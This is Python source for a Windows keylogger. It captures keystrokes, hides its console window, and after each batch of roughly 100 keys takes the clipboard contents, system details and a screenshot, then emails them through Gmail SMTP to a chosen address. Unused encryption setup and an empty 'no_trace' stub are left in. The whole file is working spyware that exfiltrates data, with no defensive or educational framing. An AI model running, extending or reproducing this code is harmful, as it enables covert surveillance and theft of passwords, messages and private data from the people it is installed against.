from pynput import keyboard
from cryptography.fernet import Fernet
import base64
import psutil, platform
import smtplib, ssl
import os
import pyperclip
import pyautogui
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText 
from email.mime.base import MIMEBase
from email import encoders
import win32console, win32gui


#def no_trace():


sender_email = ""
sender_pwd = ""
receiver_email = ""
SENTENCE = 100

context = ssl.create_default_context()

def prompt():
    global sender_email, receiver_email, sender_pwd
    sender_email = input("Enter sender email: ")
    sender_pwd = input("Enter password for email or 2fa server-code")
    receiver_email = input("Enter receiver email: ")


data = []
key = Fernet.generate_key()
cipher_suite = Fernet(key)


def no_show() -> None:
    window = win32console.GetConsoleWindow()
    win32gui.ShowWindow(window, 0)

def get_system_info() -> dict:
    system_info = {
        "CPU usage:": psutil.cpu_percent(),
        "Memory Usage: ": psutil.virtual_memory().percent,
        "OS: ": platform.system(),
        "OS Version": platform.version(),
    }
    return system_info

def get_clipboard_data():
    clipboard_data: str = pyperclip.paste()
    return clipboard_data

def get_screenshots() -> str:
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    return "screenshot.png"

def start_email_service(data) -> None:
    clipboard_data = get_clipboard_data()
    sys_info = get_system_info()
    screenshot = get_screenshots()
    attachment = open(screenshot, "rb")

    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = receiver_email
    msg['Subject'] = "Other.exe"

    body = f"keystrokes: {data}\n\nClipboard: {clipboard_data}\n\nSystem info: {sys_info}"
    msg.attach(MIMEText(body, 'plain'))

    with open(screenshot, "rb") as attachment:
        mime_base = MIMEBase('application', 'octet-stream')
        mime_base.set_payload(attachment.read())
        encoders.encode_base64(mime_base)
        mime_base.add_header('Content-Disposition', f"attachment; filename = screenshot.png")
        msg.attach(mime_base)

    try:
        smtp = smtplib.SMTP("smtp.gmail.com", 587)
        smtp.starttls()
        smtp.login(sender_email, sender_pwd)
        smtp.send_message(msg)
        os.remove(screenshot)
    except Exception as e:
        print(f"Could not send email: {str(e)}")

    if os.path.exists(screenshot):
        os.remove(screenshot)


def pressed(key) -> None:
    print(str(key))
    try:
        data.append(str(key))
    except AttributeError:
        data.append(f"{str(key)}")
    if len(data) > SENTENCE:
        start_email_service(data)
        data.clear()

if __name__ == "__main__":
    prompt()
    no_show()
    listener = keyboard.Listener(on_press=pressed)
    listener.start()
    input()